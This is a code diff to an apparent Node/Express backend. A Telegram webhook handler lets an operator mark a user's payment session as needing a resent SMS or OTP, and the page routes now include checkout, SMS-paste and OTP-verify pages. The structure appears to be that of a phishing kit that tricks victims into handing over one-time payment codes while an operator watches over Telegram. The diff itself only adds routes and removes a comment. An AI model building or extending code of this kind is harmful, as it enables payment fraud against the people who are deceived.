@@ -391,7 +391,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
       session.status = 'resend_requested';
       session.resendRequestedAt = Date.now();
 
-      // Set user-facing message
       if (step === 'sms') {
         session.userMessage = 'You pasted the wrong SMS. Ensure your details match this order to complete the payment.';
       } else if (step === 'otp') {
@@ -503,12 +502,14 @@ app.post('/api/telegram-webhook', async (req, res) => {
    FALLBACK PAGE ROUTES
    ============================================================ */
 const pageRoutes = {
-  '/':            'index.html',
-  '/dashboard/':  'index.html',
-  '/plans/':      'plans.html',
-  '/checkout/':   'checkout.html',
-  '/sms-paste/':  'sms-paste.html',
-  '/otp-verify/': 'otp-verify.html'
+  '/':              'index.html',
+  '/dashboard/':    'index.html',
+  '/plans/':        'plans.html',
+  '/checkout/':     'checkout.html',
+  '/sms-paste/':    'sms-paste.html',
+  '/otp-verify/':   'otp-verify.html',
+  '/settings/':     'settings.html',
+  '/entertainment/':'entertainment.html'
 };
 
 Object.entries(pageRoutes).forEach(([route, file]) => {
